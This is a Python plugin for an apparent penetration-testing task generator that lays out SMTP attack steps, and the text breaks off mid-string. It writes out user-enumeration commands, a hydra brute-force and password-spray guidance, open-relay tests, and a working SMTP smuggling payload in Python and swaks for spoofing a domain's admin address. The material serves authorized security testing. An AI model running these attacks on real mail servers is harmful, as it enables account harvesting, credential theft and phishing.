"""
SMTP/IMAP service enumeration plugin

Generates comprehensive tasks for SMTP and IMAP enumeration including:
- Banner grabbing and connection testing (SMTP: 25/465/587, IMAP: 143/993)
- NTLM authentication information disclosure
- Internal server name disclosure
- User enumeration (VRFY, RCPT TO, EXPN methods)
- Open relay testing
- Command enumeration
- Mail spoofing countermeasure analysis (SPF/DKIM/DMARC)
- SMTP Smuggling attacks (parser desynchronization exploitation)
- Email header analysis for topology discovery (NDN/bounce messages)
- EICAR AV detection and fingerprinting
- IMAP credential testing and email access

Extracted from HackTricks:
- pentesting-smtp/README.md (610 lines)
- pentesting-smtp/smtp-smuggling.md (39 lines)
- pentesting-smtp/smtp-commands.md (50 lines)
- pentesting-imap.md (199 lines)

Generated by: CrackPot v1.0
Expanded: 2025-10-07 (SMTP Smuggling, Email Recon, IMAP integration)
"""

from typing import Dict, Any, List
from .base import ServicePlugin
from .registry import ServiceRegistry


@ServiceRegistry.register
class SMTPPlugin(ServicePlugin):
    """SMTP enumeration plugin"""

    @property
    def name(self) -> str:
        return "smtp"

    @property
    def default_ports(self) -> List[int]:
        return [25, 465, 587]

    @property
    def service_names(self) -> List[str]:
        return ['smtp', 'smtps', 'esmtp', 'sendmail', 'submission']

    def detect(self, port_info: Dict[str, Any], profile: 'TargetProfile') -> bool:
        """Detect SMTP services"""
        service = port_info.get('service', '').lower()
        port = port_info.get('port')

        # Check service name
        if any(svc in service for svc in self.service_names):
            return True

        # Check common ports
        if port in self.default_ports:
            return True

        return False

    def get_task_tree(self, target: str, port: int, service_info: Dict[str, Any]) -> Dict[str, Any]:
        """Generate SMTP enumeration task tree"""
        version = service_info.get('version', '')
        product = service_info.get('product', '')

        tasks = {
            'id': f'smtp-enum-{port}',
            'name': f'SMTP Enumeration (Port {port})',
            'type': 'parent',
            'children': []
        }

        # Task 1: Banner Grabbing
        if port == 25:
            # Standard SMTP
            tasks['children'].append({
                'id': f'banner-grab-{port}',
                'name': 'Banner Grabbing (SMTP)',
                'type': 'command',
                'metadata': {
                    'command': f'nc -vn {target} {port}',
                    'description': 'Connect to SMTP server and grab banner (reveals version and hostname)',
                    'tags': ['OSCP:HIGH', 'QUICK_WIN', 'MANUAL'],
                    'flag_explanations': {
                        '-v': 'Verbose output (shows connection details)',
                        '-n': 'Numeric IP addresses only (no DNS resolution - faster)',
                        f'{port}': f'Target SMTP port {port}'
                    },
                    'success_indicators': [
                        '220 response code (service ready)',
                        'Banner contains server software and version',
                        'Hostname disclosed in banner',
                        'Connection successful'
                    ],
                    'failure_indicators': [
                        'Connection refused (firewall or service down)',
                        'Connection timeout',
                        'No banner received'
                    ],
                    'next_steps': [
                        'Note exact version for exploit research',
                        'Document hostname for internal reconnaissance',
                        'Test SMTP commands (HELO, EHLO, VRFY)',
                        'Check for NTLM auth if Windows server'
                    ],
                    'alternatives': [
                        f'telnet {target} {port}',
                        f'nmap -p{port} -sV {target}',
                        f'nmap -p{port} --script banner {target}'
                    ],
                    'notes': 'Banner often reveals OS, mail server software (Sendmail, Postfix, Exchange), and version. Critical for exploit research.',
                    'time_estimate': '10-30 seconds'
                }
            })
        elif port == 465:
            # SMTPS (SSL without STARTTLS)
            tasks['children'].append({
                'id': f'banner-grab-{port}',
                'name': 'Banner Grabbing (SMTPS SSL)',
                'type': 'command',
                'metadata': {
                    'command': f'openssl s_client -crlf -connect {target}:{port}',
                    'description': 'Connect to SMTPS over SSL/TLS (port 465) and grab banner',
                    'tags': ['OSCP:HIGH', 'QUICK_WIN', 'MANUAL'],
                    'flag_explanations': {
                        's_client': 'OpenSSL SSL/TLS client tool',
                        '-crlf': 'Translate LF to CRLF (required for SMTP protocol)',
                        '-connect': 'Host:port to connect to'
                    },
                    'success_indicators': [
                        'SSL handshake successful',
                        '220 response code',
                        'Banner with version displayed'
                    ],
                    'failure_indicators': [
                        'SSL handshake failed',
                        'Connection refused',
                        'Wrong SSL/TLS version'
                    ],
                    'next_steps': [
                        'Note SSL/TLS version used',
                        'Check certificate for hostname/domain info',
                        'Test SMTP commands over SSL'
                    ],
                    'alternatives': [
                        f'nmap -p{port} -sV --script ssl-cert {target}',
                        f'nmap -p{port} --script smtp-commands {target}'
                    ],
                    'notes': 'Port 465 uses implicit SSL (no STARTTLS). Certificate may leak internal hostnames.'
                }
            })
        elif port == 587:
            # Submission port (STARTTLS)
            tasks['children'].append({
                'id': f'banner-grab-{port}',
                'name': 'Banner Grabbing (SMTP STARTTLS)',
                'type': 'command',
                'metadata': {
                    'command': f'openssl s_client -starttls smtp -crlf -connect {target}:{port}',
                    'description': 'Connect to SMTP submission port with STARTTLS upgrade',
                    'tags': ['OSCP:HIGH', 'QUICK_WIN', 'MANUAL'],
                    'flag_explanations': {
                        '-starttls smtp': 'Start plain connection, then upgrade to TLS via STARTTLS command',
                        '-crlf': 'Translate LF to CRLF (SMTP protocol requirement)',
                        '-connect': 'Host:port to connect to'
                    },
                    'success_indicators': [
                        'STARTTLS upgrade successful',
                        '220 response after TLS handshake',
                        'Banner displayed'
                    ],
                    'failure_indicators': [
                        'STARTTLS not supported',
                        'TLS upgrade failed',
                        'Connection closed unexpectedly'
                    ],
                    'next_steps': [
                        'Test SMTP commands over TLS',
                        'Check for authentication requirements',
                        'Note encryption strength'
                    ],
                    'alternatives': [
                        f'nmap -p{port} --script smtp-commands {target}',
                        f'telnet {target} {port} (then type STARTTLS manually)'
                    ],
                    'notes': 'Port 587 is submission port, often requires authentication. STARTTLS upgrades plain connection to encrypted.'
                }
            })

        # Task 2: Find MX Servers (if domain known)
        tasks['children'].append({
            'id': f'mx-lookup-{port}',
            'name': 'MX Server Discovery',
            'type': 'manual',
            'metadata': {
                'description': 'Find mail exchange (MX) servers for organization (requires domain name)',
                'tags': ['MANUAL', 'OSCP:MEDIUM', 'QUICK_WIN'],
                'notes': f'''
If you know the organization's domain, find their mail servers:

Command: dig +short mx <DOMAIN>

Example: dig +short mx google.com

Why: MX records reveal all mail servers for a domain. May discover:
- Multiple mail servers (redundancy)
- Cloud email providers (Office365, Google Workspace)
- Internal mail server hostnames
- Email infrastructure topology

Next Steps:
- Test each MX server for open relay
- Check for different configurations per server
- Look for misconfigured backup MX servers
''',
                'success_indicators': [
                    'MX records returned',
                    'Priority numbers shown',
                    'Multiple mail servers discovered'
                ],
                'alternatives': [
                    'nslookup -type=mx <DOMAIN>',
                    'host -t MX <DOMAIN>',
                    'Online tools: mxtoolbox.com'
                ]
            }
        })

        # Task 3: Command Enumeration
        tasks['children'].append({
            'id': f'command-enum-{port}',
            'name': 'SMTP Command Enumeration',
            'type': 'command',
            'metadata': {
                'command': f'nmap -p{port} --script smtp-commands {target}',
                'description': 'Enumerate available SMTP commands (VRFY, EXPN, RCPT TO, etc.)',
                'tags': ['OSCP:HIGH', 'QUICK_WIN', 'AUTOMATED'],
                'flag_explanations': {
                    f'-p{port}': f'Target port {port}',
                    '--script smtp-commands': 'NSE script to enumerate SMTP commands via EHLO/HELP'
                },
                'success_indicators': [
                    'Command list returned',
                    'VRFY command available (user enumeration possible)',
                    'EXPN command available (mailing list expansion)',
                    'RCPT TO available'
                ],
                'failure_indicators': [
                    'Script timed out',
                    'No commands enumerated',
                    'Connection refused'
                ],
                'next_steps': [
                    'If VRFY enabled: Test user enumeration',
                    'If EXPN enabled: Try mailing list expansion',
                    'If RCPT TO only: Use RCPT TO for user enum',
                    'Document which commands are disabled'
                ],
                'alternatives': [
                    f'Manual: telnet {target} {port}, then type EHLO test, then HELP',
                    f'nc {target} {port}, type EHLO, observe response'
                ],
                'notes': 'Modern servers often disable VRFY/EXPN to prevent user enumeration. RCPT TO usually available.'
            }
        })

        # Task 4: NTLM Information Disclosure (Windows servers)
        if 'windows' in version.lower() or 'microsoft' in version.lower() or 'exchange' in version.lower():
            tasks['children'].append({
                'id': f'ntlm-info-{port}',
                'name': 'NTLM Authentication Info Disclosure',
                'type': 'parent',
                'children': [
                    {
                        'id': f'ntlm-manual-{port}',
                        'name': 'NTLM Info (Manual)',
                        'type': 'manual',
                        'metadata': {
                            'description': 'Extract internal information via NTLM authentication headers',
                            'tags': ['OSCP:HIGH', 'MANUAL', 'WINDOWS'],
                            'notes': f'''
Windows SMTP servers supporting NTLM auth leak internal information in auth headers:
- Internal hostname
- Domain name
- Windows version

Manual Steps:
1. Connect: telnet {target} {port}
2. Wait for 220 banner
3. Type: HELO test
4. Wait for 250 response
5. Type: AUTH NTLM 334
6. If you see "334 NTLM supported", type: TlRMTVNTUAABAAAAB4IIAAAAAAAAAAAAAAAAAAAAAAA=
7. Server responds with Base64 NTLM challenge containing version info
8. Decode Base64 response to see internal hostname, domain, Windows version

Success: Internal hostname/domain/version disclosed
Failure: AUTH NTLM not supported, authentication required

Why This Works: NTLM Type 2 challenge response contains NetBIOS domain, computer name, DNS domain, DNS hostname, and Windows version. Server sends this BEFORE authentication completes.

Next Steps:
- Document exact Windows version for exploit research
- Note internal hostname for DNS/network recon
- Use domain name for AD enumeration
''',
                            'success_indicators': [
                                '334 NTLM supported',
                                'Base64 challenge response',
                                'Internal hostname visible after decoding'
                            ],
                            'failure_indicators': [
                                'AUTH NTLM not supported',
                                '535 Authentication failed',
                                'Connection closed'
                            ]
                        }
                    },
                    {
                        'id': f'ntlm-nmap-{port}',
                        'name': 'NTLM Info (Automated)',
                        'type': 'command',
                        'metadata': {
                            'command': f'nmap -p{port} --script smtp-ntlm-info {target}',
                            'description': 'Automated NTLM information extraction via nmap',
                            'tags': ['OSCP:HIGH', 'AUTOMATED', 'QUICK_WIN', 'WINDOWS'],
                            'flag_explanations': {
                                '--script smtp-ntlm-info': 'NSE script to extract NTLM info disclosure'
                            },
                            'success_indicators': [
                                'NetBIOS domain name',
                                'NetBIOS computer name',
                                'DNS domain name',
                                'DNS computer name',
                                'Windows version disclosed'
                            ],
                            'failure_indicators': [
                                'NTLM not supported',
                                'Script failed',
                                'No info disclosed'
                            ],
                            'next_steps': [
                                'Research Windows version for exploits',
                                'Use domain info for AD enumeration',
                                'Check internal hostname for other services'
                            ],
                            'alternatives': [
                                'Manual method (see NTLM Info Manual task)',
                                'Metasploit: auxiliary/scanner/smtp/smtp_ntlm_domain'
                            ],
                            'notes': 'Works on Exchange and Windows SMTP servers. Info leaked before authentication.'
                        }
                    }
                ]
            })

        # Task 5: Internal Server Name Disclosure
        tasks['children'].append({
            'id': f'internal-name-{port}',
            'name': 'Internal Server Name Disclosure',
            'type': 'manual',
            'metadata': {
                'description': 'Extract internal server name via MAIL FROM auto-completion',
                'tags': ['OSCP:MEDIUM', 'MANUAL'],
                'notes': f'''
Some SMTP servers auto-complete sender address, disclosing internal hostname:

Manual Steps:
1. Connect: telnet {target} {port}
2. Wait for 220 banner
3. Type: EHLO test
4. Wait for 250 response
5. Type: MAIL FROM: me
6. Server may respond: 250 2.1.0 me@INTERNAL-HOSTNAME.domain.com....Sender OK

Success: Internal hostname disclosed in MAIL FROM response
Failure: Server requires full email address, no auto-completion

Why: Some mail servers helpfully "fix" incomplete addresses by appending their internal hostname. This is especially common on older Exchange servers.

Example Response:
250 2.1.0 me@PRODSERV01.contoso.local....Sender OK
                ^-- Internal hostname leaked

Next Steps:
- Document internal hostname for reconnaissance
- Try hostname in other services (SMB, RDP, HTTP)
- Check if hostname resolves internally
''',
                'success_indicators': [
                    '250 Sender OK response',
                    'Full email address with internal hostname',
                    'Internal domain name visible'
                ],
                'failure_indicators': [
                    '553 Sender address rejected',
                    '501 Syntax error',
                    'No auto-completion'
                ]
            }
        })

        # Task 6: User Enumeration (Primary Decision Tree)
        user_enum_tasks = {
            'id': f'user-enum-{port}',
            'name': 'User Enumeration',
            'type': 'parent',
            'children': []
        }

        # Method 1: VRFY (Primary)
        user_enum_tasks['children'].append({
            'id': f'vrfy-enum-{port}',
            'name': 'User Enum: VRFY Method (Primary)',
            'type': 'parent',
            'children': [
                {
                    'id': f'vrfy-manual-{port}',
                    'name': 'VRFY Manual Test',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Manually enumerate users via VRFY command',
                        'tags': ['OSCP:HIGH', 'MANUAL', 'ENUM'],
                        'notes': f'''
VRFY (Verify) command checks if user exists on mail server. Often disabled on modern systems.

Manual Steps:
1. Connect: telnet {target} {port}
2. Type: HELO test
3. Type: VRFY root
4. Responses:
   - 250 = User exists: "250 Super-User root@hostname"
   - 550 = User unknown: "550 root... User unknown"

Test common users:
- VRFY root
- VRFY admin
- VRFY administrator
- VRFY postmaster
- VRFY webmaster

Success: Different responses for valid vs invalid users
Failure: "252 Cannot VRFY user" (command disabled), same response for all users (enumeration protection)

If VRFY Disabled: Try RCPT TO method (fallback)

Why VRFY: Direct way to verify user accounts without sending mail. Attackers use for username harvesting before password attacks.
''',
                        'success_indicators': [
                            '250 response for valid users',
                            '550 response for invalid users',
                            'Clear differentiation between valid/invalid'
                        ],
                        'failure_indicators': [
                            '252 Cannot VRFY user (command disabled)',
                            'Same response for all users',
                            '502 Command not implemented'
                        ],
                        'next_steps': [
                            'If working: Test userlist with smtp-user-enum',
                            'If disabled: Try RCPT TO method',
                            'Document discovered users'
                        ]
                    }
                },
                {
                    'id': f'vrfy-auto-{port}',
                    'name': 'VRFY Automated (smtp-user-enum)',
                    'type': 'command',
                    'metadata': {
                        'command': f'smtp-user-enum -M VRFY -U /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt -t {target} -p {port}',
                        'description': 'Automated user enumeration via VRFY command',
                        'tags': ['OSCP:HIGH', 'AUTOMATED', 'ENUM'],
                        'flag_explanations': {
                            '-M VRFY': 'Method: Use VRFY command',
                            '-U': 'Userlist file path',
                            '-t': 'Target IP address',
                            f'-p {port}': f'Target port {port}'
                        },
                        'success_indicators': [
                            'Valid users found',
                            'Users listed with 250 response codes',
                            'Tool completes without errors'
                        ],
                        'failure_indicators': [
                            'No users found',
                            'VRFY disabled (252 responses)',
                            'Connection errors'
                        ],
                        'next_steps': [
                            'Save discovered users to file',
                            'Attempt password spray on valid users',
                            'Research users for social engineering'
                        ],
                        'alternatives': [
                            f'nmap -p{port} --script smtp-enum-users --script-args smtp-enum-users.methods={{VRFY}} {target}',
                            'Metasploit: auxiliary/scanner/smtp/smtp_enum',
                            f'Manual: telnet {target} {port}, then VRFY <username>'
                        ],
                        'notes': 'Use small wordlist for speed. Common usernames: root, admin, administrator, postmaster, webmaster, info, sales, support.'
                    }
                }
            ]
        })

        # Method 2: RCPT TO (Fallback)
        user_enum_tasks['children'].append({
            'id': f'rcpt-enum-{port}',
            'name': 'User Enum: RCPT TO Method (Fallback)',
            'type': 'parent',
            'children': [
                {
                    'id': f'rcpt-manual-{port}',
                    'name': 'RCPT TO Manual Test',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Enumerate users via RCPT TO command (reliable fallback when VRFY disabled)',
                        'tags': ['OSCP:HIGH', 'MANUAL', 'ENUM'],
                        'notes': f'''
RCPT TO method: More reliable than VRFY, rarely disabled (required for mail delivery).

Manual Steps:
1. Connect: telnet {target} {port}
2. Type: HELO test
3. Type: MAIL FROM:test@example.com
4. Type: RCPT TO:root
5. Responses:
   - 250 = User exists: "250 2.1.5 root... Recipient ok"
   - 550 = User unknown: "550 5.1.1 root... User unknown"

Full Example:
$ telnet {target} {port}
220 mailserver ESMTP
HELO test
250 mailserver Hello
MAIL FROM:test@example.com
250 2.1.0 test@example.com... Sender ok
RCPT TO:admin
550 5.1.1 admin... User unknown
RCPT TO:root
250 2.1.5 root... Recipient ok  <-- USER EXISTS

Why RCPT TO Works: Server must check if recipient exists to route mail. Rarely disabled. More reliable than VRFY.

Test Common Users: root, admin, administrator, postmaster, webmaster, user, test
''',
                        'success_indicators': [
                            '250 Recipient ok (user exists)',
                            '550 User unknown (user doesn\'t exist)',
                            'Clear differentiation in responses'
                        ],
                        'failure_indicators': [
                            'Authentication required',
                            'Same response for all users',
                            'Connection closed'
                        ],
                        'next_steps': [
                            'If working: Automate with smtp-user-enum',
                            'Document valid users',
                            'Try password spray on discovered accounts'
                        ]
                    }
                },
                {
                    'id': f'rcpt-auto-{port}',
                    'name': 'RCPT TO Automated',
                    'type': 'command',
                    'metadata': {
                        'command': f'smtp-user-enum -M RCPT -U /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt -t {target} -p {port} -D example.com',
                        'description': 'Automated user enumeration via RCPT TO (most reliable method)',
                        'tags': ['OSCP:HIGH', 'AUTOMATED', 'ENUM'],
                        'flag_explanations': {
                            '-M RCPT': 'Method: Use RCPT TO command',
                            '-U': 'Userlist file path',
                            '-t': 'Target IP address',
                            f'-p {port}': f'Target port {port}',
                            '-D example.com': 'Domain to test (use target domain if known)'
                        },
                        'success_indicators': [
                            'Valid users discovered',
                            '250 responses for existing users',
                            'Tool completes successfully'
                        ],
                        'failure_indicators': [
                            'No users found',
                            'Authentication required before RCPT TO',
                            'All same responses (enum protection)'
                        ],
                        'next_steps': [
                            'Save valid usernames',
                            'Attempt credential attacks',
                            'Research user roles'
                        ],
                        'alternatives': [
                            f'nmap -p{port} --script smtp-enum-users --script-args smtp-enum-users.methods={{RCPT}} {target}',
                            'Metasploit: auxiliary/scanner/smtp/smtp_enum with RCPT method',
                            'Manual: See RCPT TO Manual Test'
                        ],
                        'notes': 'RCPT TO more reliable than VRFY. Required for mail delivery, rarely disabled. Replace example.com with actual target domain if known.'
                    }
                }
            ]
        })

        # Method 3: EXPN (Mailing Lists)
        user_enum_tasks['children'].append({
            'id': f'expn-enum-{port}',
            'name': 'User Enum: EXPN Method (Mailing Lists)',
            'type': 'manual',
            'metadata': {
                'description': 'Expand mailing lists via EXPN command',
                'tags': ['OSCP:MEDIUM', 'MANUAL', 'ENUM'],
                'notes': f'''
EXPN (Expand) command expands mailing lists/aliases to show member addresses.

Manual Steps:
1. Connect: telnet {target} {port}
2. Type: HELO test
3. Type: EXPN root
4. Response: 250 2.1.5 ed.williams@mailserver (list members)

Example:
EXPN sshd
250 2.1.5 sshd privsep sshd@mailserver
EXPN test
550 5.1.1 test... User unknown

Common Aliases to Test:
- EXPN root (often maps to actual admin)
- EXPN postmaster
- EXPN admin
- EXPN all
- EXPN staff
- EXPN users

Success: Mailing list expanded, member emails disclosed
Failure: "252 Cannot EXPN" (command disabled), "550 User unknown"

Why: EXPN reveals actual user accounts behind aliases. Less common than VRFY/RCPT TO, often disabled.

If EXPN Disabled: Already tried VRFY and RCPT TO (better methods)
''',
                'success_indicators': [
                    '250 response with expanded list',
                    'Multiple email addresses returned',
                    'Alias resolved to real user'
                ],
                'failure_indicators': [
                    '252 Cannot EXPN',
                    '502 Command not implemented',
                    '550 User unknown for all tests'
                ],
                'next_steps': [
                    'Document revealed email addresses',
                    'Note username patterns (firstname.lastname, etc)',
                    'Cross-reference with other discovered users'
                ]
            }
        })

        # Add complete user enumeration tree
        tasks['children'].append(user_enum_tasks)

        # Task 7: Open Relay Testing
        tasks['children'].append({
            'id': f'open-relay-{port}',
            'name': 'Open Relay Testing',
            'type': 'command',
            'metadata': {
                'command': f'nmap -p{port} --script smtp-open-relay {target} -v',
                'description': 'Test if SMTP server is an open relay (accepts mail from/to any address)',
                'tags': ['OSCP:HIGH', 'AUTOMATED', 'ENUM'],
                'flag_explanations': {
                    f'-p{port}': f'Target port {port}',
                    '--script smtp-open-relay': 'NSE script to test open relay configuration',
                    '-v': 'Verbose output (shows test attempts)'
                },
                'success_indicators': [
                    'Server is an open relay',
                    'Test email accepted from external source',
                    'Relay allowed for any sender/recipient'
                ],
                'failure_indicators': [
                    'Relay access denied',
                    '550 Relaying denied',
                    'Authentication required'
                ],
                'next_steps': [
                    'If open relay: Document critical vulnerability',
                    'Test email spoofing (send test mail)',
                    'Check SPF/DKIM/DMARC records for domain',
                    'Report as high-severity misconfiguration'
                ],
                'alternatives': [
                    f'''Manual test:
telnet {target} {port}
HELO test
MAIL FROM:attacker@external.com
RCPT TO:victim@external.com
(If accepted, it's an open relay)''',
                    'Metasploit: auxiliary/scanner/smtp/smtp_relay'
                ],
                'notes': '''
Open Relay: SMTP server configured to accept/forward email from any source to any destination.

Security Impact:
- Spammers abuse for bulk email
- Attackers use for phishing campaigns
- Can send mail appearing to come from organization
- May blacklist organization's mail server

Common Misconfigurations:
- mynetworks = 0.0.0.0/0 (accepts all IPs)
- No sender/recipient restrictions
- No authentication required

Modern servers rarely open relays, but still found on legacy systems.
'''
            }
        })

        # Task 8: Authentication Brute-force
        tasks['children'].append({
            'id': f'smtp-bruteforce-{port}',
            'name': 'Authentication Brute-force',
            'type': 'command',
            'metadata': {
                'command': f'hydra -l admin -P /usr/share/wordlists/rockyou.txt {target} smtp -s {port} -v',
                'description': 'Brute-force SMTP authentication (try discovered users first)',
                'tags': ['OSCP:MEDIUM', 'AUTOMATED', 'NOISY'],
                'flag_explanations': {
                    '-l admin': 'Username to test (replace with discovered username)',
                    '-P': 'Password wordlist',
                    'smtp': 'Protocol/service to attack',
                    f'-s {port}': f'Service port {port}',
                    '-v': 'Verbose output (show attempts)'
                },
                'success_indicators': [
                    'Valid credentials found',
                    '[25][smtp] host: X login: Y password: Z',
                    'Authentication successful'
                ],
                'failure_indicators': [
                    'All attempts failed',
                    'Account lockout triggered',
                    'Connection rate-limited'
                ],
                'next_steps': [
                    'If successful: Document credentials',
                    'Test credentials on other services (SSH, SMB, HTTP)',
                    'Send test email as authenticated user',
                    'Check for mail access (IMAP/POP3)'
                ],
                'alternatives': [
                    f'medusa -h {target} -u admin -P passwords.txt -M smtp',
                    f'ncrack -p {port} -u admin -P passwords.txt {target}',
                    'Manual: telnet, AUTH PLAIN, test common passwords'
                ],
                'notes': '''
Only attempt after user enumeration. Use discovered usernames for targeted attack.

Smart Strategy:
1. Test default creds first: admin/admin, postmaster/postmaster
2. Password spray: Test one password across all users (avoid lockout)
3. Small custom wordlist: Company name, year, common passwords

OSCP Exam: SMTP brute-force rarely necessary. Try default credentials first.

Time: Can be slow. Allocate 10-30 minutes max for exam.
''',
                'time_estimate': '10-30 minutes (depending on wordlist size)'
            }
        })

        # Task 9: Mail Spoofing Checks (SPF/DKIM/DMARC)
        tasks['children'].append({
            'id': f'spoofing-checks-{port}',
            'name': 'Mail Spoofing Countermeasures',
            'type': 'manual',
            'metadata': {
                'description': 'Check SPF, DKIM, DMARC records for mail spoofing potential',
                'tags': ['OSCP:MEDIUM', 'MANUAL', 'ENUM'],
                'notes': f'''
Organizations use SPF, DKIM, DMARC to prevent email spoofing.

Commands (requires domain name):
1. SPF Check:
   dig txt <DOMAIN> | grep spf
   dig txt _spf.<DOMAIN>

2. DMARC Check:
   dig txt _dmarc.<DOMAIN>

3. DKIM Check:
   dig txt <SELECTOR>._domainkey.<DOMAIN>
   (selector found in email headers)

Success: Records exist and properly configured
Failure: No records found, weak policies

What to Look For:

SPF:
- "v=spf1 ~all" = SOFTFAIL (accepts but marks)
- "v=spf1 -all" = FAIL (rejects)
- "v=spf1 +all" = MISCONFIGURED (accepts all - spoofing possible!)

DMARC:
- "p=none" = Monitor only (spoofing possible)
- "p=quarantine" = Mark as spam
- "p=reject" = Reject spoofed mail

No Records: Email spoofing likely possible (old/small organizations)

Next Steps:
- If weak/missing: Test email spoofing via web contact forms
- If strong: Spoofing unlikely to succeed
- Document for social engineering assessment

Tools:
- mxtoolbox.com (online SPF/DMARC checker)
- checkdmarc (pip install checkdmarc)
''',
                'success_indicators': [
                    'SPF/DKIM/DMARC records found',
                    'Policy strengths determined',
                    'Spoofing potential assessed'
                ],
                'failure_indicators': [
                    'No DNS records for target domain',
                    'Domain name unknown',
                    'DNS resolution failed'
                ],
                'alternatives': [
                    'Online: mxtoolbox.com/spf.aspx',
                    'Tool: checkdmarc <DOMAIN>',
                    'dig queries as shown above'
                ]
            }
        })

        # Task 10: SMTP Smuggling (NEW - Advanced Attack)
        tasks['children'].append({
            'id': f'smtp-smuggling-{port}',
            'name': 'SMTP Smuggling Attack (Advanced)',
            'type': 'parent',
            'children': [
                {
                    'id': f'smtp-smuggling-theory-{port}',
                    'name': 'SMTP Smuggling - Understanding the Vulnerability',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Exploit parser desynchronization between outbound/inbound SMTP servers',
                        'tags': ['OSCP:MEDIUM', 'ADVANCED', 'MANUAL'],
                        'notes': f'''
SMTP Smuggling: Abuse differences in how SMTP servers interpret message end markers

WHAT IS IT:
- Exploits discrepancies in SMTP protocol interpretation
- Outbound server sees 1 email, Inbound server sees multiple emails
- Allows impersonating other domain users (e.g., admin@target.com)
- Bypasses SPF because sender domain remains legitimate

HOW IT WORKS:
Normal end-of-message marker: \\r\\n.\\r\\n
Some Inbound servers ALSO accept: \\n. or \\n.\\r

Attack Flow:
1. Attacker sends email from user@target.com to victim@external.com
2. Email body contains: \\n. (desync marker)
3. Attacker follows with smuggled SMTP commands:
   MAIL FROM: admin@target.com
   RCPT TO: victim2@external.com
   DATA
   Smuggled email content
   .
4. Outbound server sees: 1 email from user@target.com
5. Inbound server sees: 2 emails (original + smuggled from admin@target.com)

DESYNC MARKERS TO TEST:
- \\n.
- \\n.\\r

WHY SPF BYPASS:
- SPF checks sender domain (target.com)
- Smuggled email still comes from target.com mail server
- SPF PASS even though impersonating admin@target.com

REQUIREMENTS:
- Access to send email from target domain (or open relay)
- Outbound/Inbound parser desynchronization
- Knowledge of target SMTP infrastructure

DETECTION:
1. Send test email to external address you control
2. Include \\n. in message body
3. Include follow-on SMTP commands after marker
4. Check if 2+ emails received (smuggling successful)

EXAMPLE TEST EMAIL BODY:
Test message content here.\\n.
MAIL FROM:<admin@{target}>
RCPT TO:<yourtest@external.com>
DATA
Subject: Smuggled Email
From: admin@{target}

This email was smuggled!
.

IMPACT:
- Email spoofing from any user in domain
- Bypass email authentication (SPF/DKIM/DMARC)
- Phishing as domain administrators
- Social engineering attacks

REFERENCE:
- Original research: sec-consult.com/blog/detail/smtp-smuggling-spoofing-e-mails-worldwide/
- Affects: Sendmail, Postfix, Exim (depending on config)

OSCP RELEVANCE: Medium (advanced technique, not typical exam scenario)
But demonstrates deep protocol understanding and attack creativity.
''',
                        'success_indicators': [
                            'Multiple emails received from single send',
                            'Smuggled email displays different sender',
                            'SPF passes for smuggled email'
                        ],
                        'failure_indicators': [
                            'Only 1 email received',
                            'Desync markers visible in email body',
                            'SMTP server normalizes end markers'
                        ],
                        'next_steps': [
                            'Test with \\n. desync marker first',
                            'Try \\n.\\r if \\n. fails',
                            'Monitor received emails for smuggling success',
                            'Document vulnerable Inbound server behavior'
                        ],
                        'alternatives': [
                            'Traditional email spoofing (if SPF weak)',
                            'Open relay abuse (if misconfigured)',
                            'Compromised email accounts (credential stuffing)'
                        ]
                    }
                },
                {
                    'id': f'smtp-smuggling-test-{port}',
                    'name': 'Test SMTP Smuggling Vulnerability',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Practical test for SMTP smuggling desynchronization',
                        'tags': ['OSCP:LOW', 'ADVANCED', 'MANUAL'],
                        'notes': f'''
PRACTICAL SMTP SMUGGLING TEST:

1. Setup receiving email (control this):
   - Use Gmail, ProtonMail, or personal mail server
   - Note: You'll send FROM target domain TO your controlled email

2. Craft test email using Python or swaks:

Python Example:
import smtplib
from email.mime.text import MIMEText

# Smuggling payload with \\n. desync
body = """This is a test email.
\\n.
MAIL FROM:<admin@{target}>
RCPT TO:<yourtest@gmail.com>
DATA
Subject: Smuggled Email Test
From: admin@{target}

If you receive this as a separate email, SMTP smuggling is possible!
.
"""

msg = MIMEText(body)
msg['Subject'] = 'SMTP Smuggling Test'
msg['From'] = 'user@{target}'
msg['To'] = 'yourtest@gmail.com'

# Send via target SMTP server
smtp = smtplib.SMTP('{target}', {port})
smtp.send_message(msg)
smtp.quit()

swaks Example:
swaks --to yourtest@gmail.com --from user@{target} --server {target} --port {port} --body "Test\\n.\\nMAIL FROM:<admin@{target}>\\nRCPT TO:<yourtest@gmail.com>\\nDATA\\nSubject: Smuggled\\n\\nSmuggled content\\n.\\n"

3. Analysis:
   - Check receiving inbox for 2 separate emails
   - Email 1: Original from user@{target}
   - Email 2: Smuggled from admin@{target}
   - Examine headers for SPF/DKIM/DMARC pass/fail

4. Variations to test:
   - \\n. marker
   - \\n.\\r marker
   - Different sender addresses
   - Multiple smuggled emails in one send

ETHICAL CONSIDERATIONS:
- Only test on domains you have authorization to test
- Use test accounts, not production users
- Document findings and report responsibly
- Never use for actual phishing campaigns

If successful → High severity vulnerability, report to organization
If fails → SMTP servers properly synchronized, no desync vulnerability
''',
                        'success_indicators': [
                            'Two emails received in inbox',
                            'Second email shows admin@ sender',
                            'Headers show different Message-IDs'
                        ],
                        'failure_indicators': [
                            'Only one email received',
                            'Desync markers appear as literal text',
                            'Email rejected by server'
                        ],
                        'alternatives': [
                            'Manual telnet test with SMTP commands',
                            'Email security scanner tools',
                            'Professional pentest tools (Burp Suite, etc.)'
                        ],
                        'estimated_time': '30-60 minutes (including email delivery)'
                    }
                }
            ]
        })

        # Task 11: Email Header Analysis / Topology Discovery (NEW)
        tasks['children'].append({
            'id': f'email-header-recon-{port}',
            'name': 'Email Header Analysis for Topology Discovery',
            'type': 'parent',
            'children': [
                {
                    'id': f'email-topology-test-{port}',
                    'name': 'Send Test Email to Learn Internal Topology',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Trigger email responses to discover internal infrastructure from headers',
                        'tags': ['OSCP:MEDIUM', 'RECON', 'MANUAL'],
                        'notes': f'''
EMAIL HEADER RECONNAISSANCE:

Goal: Make victim mail server send YOU an email to analyze headers

TECHNIQUE 1: Contact Form / Web Form Submission
- Find contact form on target website
- Submit form requesting response (e.g., "Request quote")
- Check received email headers for internal topology

TECHNIQUE 2: Non-Delivery Notification (NDN)
- Send email TO non-existent user@{target}
- Server responds with NDN (bounce) message
